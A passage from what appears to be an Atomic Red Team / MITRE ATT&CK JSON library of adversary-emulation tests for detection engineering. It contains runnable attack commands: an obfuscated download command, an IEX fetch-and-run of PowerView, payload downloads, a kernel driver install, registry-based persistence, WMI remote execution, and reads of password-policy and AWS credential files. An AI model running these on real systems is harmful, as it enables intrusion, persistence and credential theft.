\u2014\u0af9u\u0af0rl\u08b0ca\u08e2c\u0defhe  \u2013\u202espli\u0605t\u202e\u202d \u2212\"\u0d4f\u1da0\u0d78\" #{remote_file} #{local_path}\n\n\n2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.\n", "name": "manual"}}, {"name": "Snake Malware Encrypted crmlog file", "auto_generated_guid": "7e47ee60-9dd1-4269-9c4f-97953b183268", "description": "The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n", "supported_platforms": ["windows"], "executor": {"command": "$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\"\n", "cleanup_command": "$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = \"$env:windir\\registration\\\"; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host \"File deleted: $fullPathToDelete\" } else { Write-Host \"File not found: $fullPathToDelete\" }\n", "name": "powershell", "elevation_required": true}}, {"name": "Execution from Compressed JScript File", "auto_generated_guid": "fad04df1-5229-4185-b016-fb6010cd87ac", "description": "Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/\n", "supported_platforms": ["windows"], "input_arguments": {"url_path": {"description": "url to download JScript file", "type": "url", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1027.js must exist on disk at PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027js.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027js.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\\" -Force\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\"\n", "cleanup_command": "taskkill /f /im calculator.exe >nul 2>nul\n", "name": "command_prompt"}}]}, "T1505.004": {"name": "IIS Components", "technique_id": "attack-pattern--b46a801b-fd98-491c-a25a-bca25d6e3001", "external_id": "T1505.004", "data_components": ["File Creation", "Command Execution", "File Modification"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)", "atomic_tests": [{"name": "Install IIS Module using AppCmd.exe", "auto_generated_guid": "53adbdfa-8200-490c-871c-d3b1ab3324b2", "description": "The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using AppCmd.exe.\n[Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n", "supported_platforms": ["windows"], "input_arguments": {"module_name": {"description": "The name of the IIS module", "type": "string", "default": "DefaultDocumentModule_Atomic"}, "dll_path": {"description": "The path to the DLL to be loaded", "type": "path", "default": "%windir%\\system32\\inetsrv\\defdoc.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "IIS must be installed in order to add a module to IIS.\n", "prereq_command": "$service = get-service w3svc -ErrorAction SilentlyContinue\nif($service){ Write-Host \"IIS installed on $env:computername\" } else { Write-Host \"IIS is not installed on $env:computername\" } \n", "get_prereq_command": "Install IIS to continue.\n"}], "executor": {"command": "%windir%\\system32\\inetsrv\\appcmd.exe install module /name:#{module_name} /image:#{dll_path}\n", "cleanup_command": "%windir%\\system32\\inetsrv\\appcmd.exe uninstall module #{module_name}\n", "name": "command_prompt"}}, {"name": "Install IIS Module using PowerShell Cmdlet New-WebGlobalModule", "auto_generated_guid": "cc3381fb-4bd0-405c-a8e4-6cacfac3b06c", "description": "The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using New-WebGlobalModule.\n[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n", "supported_platforms": ["windows"], "input_arguments": {"module_name": {"description": "The name of the IIS module", "type": "string", "default": "DefaultDocumentModule_Atomic"}, "dll_path": {"description": "The path to the DLL to be loaded", "type": "path", "default": "%windir%\\system32\\inetsrv\\defdoc.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "IIS must be installed in order to add a module to IIS.\n", "prereq_command": "$service = get-service w3svc -ErrorAction SilentlyContinue\nif($service){ Write-Host \"IIS installed on $env:computername\" } else { Write-Host \"IIS is not installed on $env:computername\" } \n", "get_prereq_command": "Install IIS to continue.\n"}], "executor": {"command": "New-WebGlobalModule -Name #{module_name} -Image #{dll_path}\n", "cleanup_command": "Remove-WebGlobalModule -Name #{module_name}\n", "name": "powershell"}}]}, "T1564.006": {"name": "Run Virtual Instance", "technique_id": "attack-pattern--b5327dd1-6bf9-4785-a199-25bcbd1f4a9d", "external_id": "T1564.006", "data_components": ["Image Metadata", "Process Creation", "Command Execution", "Service Creation", "File Creation", "Windows Registry Key Modification"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)", "atomic_tests": [{"name": "Register Portable Virtualbox", "auto_generated_guid": "c59f246a-34f8-4e4d-9276-c295ef9ba0dd", "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n", "supported_platforms": ["windows"], "input_arguments": {"msi_file_path": {"description": "Path to the MSI file", "type": "path", "default": "PathToAtomicsFolder\\T1564.006\\bin\\Virtualbox_52.msi"}, "cab_file_path": {"description": "Path to the CAB file", "type": "path", "default": "PathToAtomicsFolder\\T1564.006\\bin\\common.cab"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "MSI file must exist on disk at specified location (#{msi_file_path})\n", "prereq_command": "if (Test-Path \"#{msi_file_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/Virtualbox_52.msi\" -OutFile \"#{msi_file_path}\"\n"}, {"description": "CAB file must exist on disk at specified location (#{cab_file_path})\n", "prereq_command": "if (Test-Path \"#{cab_file_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cab_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/common.cab\" -OutFile \"#{cab_file_path}\" \n"}, {"description": "Old version of Virtualbox must be installed\n", "prereq_command": "if (Test-Path \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\") {exit 0} else {exit 1}\n", "get_prereq_command": "msiexec /i \"#{msi_file_path}\" /qn\n"}], "executor": {"command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver\nregsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"\nrundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\"\nsc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV\nsc start VBoxDRV\n", "cleanup_command": "sc stop VBoxDRV\nsc delete VBoxDRV\nregsvr32 /u /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"\nmsiexec /x \"#{msi_file_path}\" /qn\n", "name": "command_prompt"}}, {"name": "Create and start VirtualBox virtual machine", "auto_generated_guid": "88b81702-a1c0-49a9-95b2-2dd53d755767", "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n", "supported_platforms": ["windows"], "input_arguments": {"vm_name": {"description": "Name of the new virtual machine", "type": "string", "default": "Atomic VM"}, "virtualbox_exe": {"description": "Path to the VirtualBox executable", "type": "path", "default": "C:\\Program Files\\Oracle\\VirtualBox\\VirtualBox.exe"}, "vboxmanage_exe": {"description": "Path to the executable for VBoxManage, the command-line interface to VirtualBox", "type": "path", "default": "C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe"}, "virtualbox_download": {"description": "URL for the current installer for the Windows version of VirtualBox, as of March 2022", "type": "url", "default": "https://download.virtualbox.org/virtualbox/6.1.32/VirtualBox-6.1.32-149290-Win.exe"}, "virtualbox_installer": {"description": "Executable for the Virtualbox installer", "type": "string", "default": "VirtualBox-6.1.32-149290-Win.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "VirtualBox must exist on disk at specified locations (#{virtualbox_exe})\n", "prereq_command": "if (Test-Path \"#{virtualbox_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile(\"#{virtualbox_download}\",\"PathToAtomicsFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\")\nstart-process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\" -ArgumentList \"--silent\" -Wait\n"}, {"description": "VBoxManage must exist on disk at specified locations (#{vboxmanage_exe})\n", "prereq_command": "if (Test-Path \"#{vboxmanage_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "$wc = New-Object System.Net.WebClient\n$wc.DownloadFile(\"#{virtualbox_download}\",\"PathToAtomicsFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\")\nstart-process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{virtualbox_installer}\" -ArgumentList \"--silent\" -Wait\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "\"#{vboxmanage_exe}\" createvm --name \"#{vm_name}\" --register\n\"#{vboxmanage_exe}\" modifyvm \"#{vm_name}\" --firmware efi\n\"#{vboxmanage_exe}\" startvm \"#{vm_name}\"\n", "cleanup_command": "\"#{vboxmanage_exe}\" controlvm \"#{vm_name}\" poweroff\n\"#{vboxmanage_exe}\" unregistervm \"#{vm_name}\" --delete"}}, {"name": "Create and start Hyper-V virtual machine", "auto_generated_guid": "fb8d4d7e-f5a4-481c-8867-febf13f8b6d3", "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n", "supported_platforms": ["windows"], "input_arguments": {"vm_name": {"description": "Name of the new virtual machine", "type": "string", "default": "Atomic VM"}}, "dependencies": [{"description": "Hyper-V must be enabled on the system\nChecks whether Hyper-V is enabled. If not, enables Hyper-V and forces a required restart\n", "prereq_command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V).State = \"Enabled\") {exit 0} else {exit 1}\n", "get_prereq_command": "Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "$VM = \"#{vm_name}\"\nNew-VM -Name $VM -Generation 2\nSet-VMFirmware $VM -EnableSecureBoot Off\nStart-VM $VM", "cleanup_command": "Stop-VM $VM -Force\nRemove-VM $VM -Force"}}]}, "T1201": {"name": "Password Policy Discovery", "technique_id": "attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5", "external_id": "T1201", "data_components": ["User Account Metadata", "Process Creation", "Command Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485"], "description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).", "atomic_tests": [{"name": "Examine password complexity policy - Ubuntu", "auto_generated_guid": "085fe567-ac84-47c7-ac4c-2688ce28265b", "description": "Lists the password complexity policy to console on Ubuntu Linux.\n", "supported_platforms": ["linux"], "executor": {"command": "cat /etc/pam.d/common-password\n", "name": "bash"}}, {"name": "Examine password complexity policy - FreeBSD", "auto_generated_guid": "a7893624-a3d7-4aed-9676-80498f31820f", "description": "Lists the password complexity policy to console on FreeBSD.\n", "supported_platforms": ["linux"], "executor": {"command": "cat /etc/pam.d/passwd\n", "name": "sh"}}, {"name": "Examine password complexity policy - CentOS/RHEL 7.x", "auto_generated_guid": "78a12e65-efff-4617-bc01-88f17d71315d", "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n", "supported_platforms": ["linux"], "dependencies": [{"description": "System must be CentOS or RHEL v7\n", "prereq_command": "if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo Please run from CentOS or RHEL v7\n"}], "executor": {"command": "cat /etc/security/pwquality.conf\n", "name": "bash"}}, {"name": "Examine password complexity policy - CentOS/RHEL 6.x", "auto_generated_guid": "6ce12552-0adb-4f56-89ff-95ce268f6358", "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n", "supported_platforms": ["linux"], "dependencies": [{"description": "System must be CentOS or RHEL v6\n", "prereq_command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then exit /b 0; else exit /b 1; fi;\n", "get_prereq_command": "echo Please run from CentOS or RHEL v6\n"}], "executor": {"command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "name": "bash"}}, {"name": "Examine password expiration policy - All Linux", "auto_generated_guid": "7c86c55c-70fa-4a05-83c9-3aa19b145d1a", "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n", "supported_platforms": ["linux"], "executor": {"command": "cat /etc/login.defs\n", "name": "bash"}}, {"name": "Examine local password policy - Windows", "auto_generated_guid": "4588d243-f24e-4549-b2e3-e627acc089f6", "description": "Lists the local password policy to console on Windows.\n", "supported_platforms": ["windows"], "executor": {"command": "net accounts\n", "name": "command_prompt"}}, {"name": "Examine domain password policy - Windows", "auto_generated_guid": "46c2c362-2679-4ef5-aec9-0e958e135be4", "description": "Lists the domain password policy to console on Windows.\n", "supported_platforms": ["windows"], "executor": {"command": "net accounts /domain\n", "name": "command_prompt"}}, {"name": "Examine password policy - macOS", "auto_generated_guid": "4b7fa042-9482-45e1-b348-4b756b2a0742", "description": "Lists the password policy to console on macOS.\n", "supported_platforms": ["macos"], "executor": {"command": "pwpolicy getaccountpolicies", "name": "bash"}}, {"name": "Get-DomainPolicy with PowerView", "auto_generated_guid": "3177f4da-3d4b-4592-8bdc-aa23d0b2e843", "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n", "name": "powershell"}}, {"name": "Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy", "auto_generated_guid": "b2698b33-984c-4a1c-93bb-e4ba72a0babb", "description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "get-addefaultdomainpasswordpolicy\n"}}, {"name": "Use of SecEdit.exe to export the local security policy (including the password policy)", "auto_generated_guid": "510cc97f-56ac-4cd3-a198-d3218c23d889", "description": "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n", "supported_platforms": ["windows"], "executor": {"command": "secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Examine AWS Password Policy", "auto_generated_guid": "15330820-d405-450b-bd08-16b5be5be9f4", "description": "This atomic test will display details about the password policy for the current AWS account.\n", "supported_platforms": ["iaas:aws"], "dependencies": [{"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"}], "executor": {"command": "aws iam get-account-password-policy\n", "name": "sh", "elevation_required": false}}]}, "T1546": {"name": "Event Triggered Execution", "technique_id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db", "external_id": "T1546", "data_components": ["File Metadata", "File Modification", "File Creation", "Process Creation", "Windows Registry Key Modification", "WMI Creation", "Module Load", "Cloud Service Modification", "Command Execution"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ", "atomic_tests": [{"name": "Persistence with Custom AutodialDLL", "auto_generated_guid": "aca9ae16-7425-4b6d-8c30-cad306fdbd5b", "description": "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n", "supported_platforms": ["windows"], "dependencies": [{"description": "AltWinSock2DLL DLL must exist on disk at specified at PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\n", "prereq_command": "if (Test-Path PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll) { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\bin\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll\" -OutFile \"PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\"\n"}], "executor": {"command": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\n", "cleanup_command": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value  $env:windir\\system32\\rasadhlp.dll", "name": "powershell", "elevation_required": true}}, {"name": "HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)", "auto_generated_guid": "a574dafe-a903-4cce-9701-14040f4f3532", "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)", "supported_platforms": ["windows"], "input_arguments": {"command": {"description": "Command to Execute", "type": "string", "default": "notepad.exe"}}, "executor": {"command": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"", "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore", "name": "powershell", "elevation_required": true}}, {"name": "HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)", "auto_generated_guid": "36b8dbf9-59b1-4e9b-a3bb-36e80563ef01", "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)", "supported_platforms": ["windows"], "input_arguments": {"command": {"description": "Command to Execute", "type": "string", "default": "notepad.exe"}}, "executor": {"command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore", "name": "powershell"}}, {"name": "WMI Invoke-CimMethod Start Process", "auto_generated_guid": "adae83d3-0df6-45e7-b2c3-575f91584577", "description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n", "supported_platforms": ["windows"], "input_arguments": {"dest": {"description": "destination computer name", "type": "string", "default": "localhost"}, "password": {"description": "password for account", "type": "string", "default": "P@ssword1"}, "username": {"description": "account to use", "type": "string", "default": "Administrator"}, "process": {"description": "process to spawn", "type": "string", "default": "calc.exe"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "# Set the remote computer name and credentials\n $RemoteComputer = \"#{dest}\"\n $PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \"#{process}\"\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n     Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\"\n } else {\n     Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\"\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession \n"}}]}, "T1546.004": {"name": "Unix Shell Configuration Modification", "technique_id": "attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2", "external_id": "T1546.004", "data_components": ["File Creation", "File Modification", "Process Creation", "Command Execution"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user\u2019s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure 